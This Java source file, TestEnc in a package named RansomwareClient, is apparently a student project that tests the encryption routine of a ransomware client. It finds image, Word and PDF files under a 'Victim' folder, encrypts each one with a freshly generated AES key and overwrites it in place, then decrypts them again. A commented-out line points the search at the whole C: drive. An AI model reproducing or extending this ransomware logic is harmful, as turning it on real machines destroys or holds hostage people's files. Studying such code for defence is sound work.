/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package RansomwareClient;

import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import javax.crypto.KeyGenerator;

/**
 *
 * @author 20175707
 */
public class TestEnc {
    public static void main(String args[])
        throws NoSuchAlgorithmException, InstantiationException, IllegalAccessException, IOException {
        
        // decide which file type to find
        String glob = "glob:**/*.{jpg,png,docx,pdf}";
	// starting location of the search 	
        //String startingLocation = "C:/";
        String startingLocation = "C:\\Users\\20175707\\Desktop\\Victim";
        
        // Creating a FileFinder and saving the paths of the found files
        FileFinder fileFind = new FileFinder();
        fileFind.findFiles(glob, startingLocation);
        final ArrayList<Path> files = fileFind.fileFound;
        
        // Generate Encryption Key
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.init(128);
        Key key = keyGenerator.generateKey();
        
        // Creating an EncryptionDecryption object
        EncryptionDecription encDec = new EncryptionDecription();
        
        // Encrypting every file 
        for (Path path : files) {
            byte[] content = encDec.getBytesFile(path);
            byte[] encrypted = encDec.encryptBytesFile(key, content);
            // Saving the encrypted file
            encDec.bytesToFile(encrypted, path);
        }
        
        // Decrypting every file 
        for (Path path : files) {
            byte[] content = encDec.getBytesFile(path);
            byte[] encrypted = encDec.decryptBytesFile(key, content);
            // Saving the decrypted file
            encDec.bytesToFile(encrypted, path);
        }


        System.out.println("Done");
    }
}
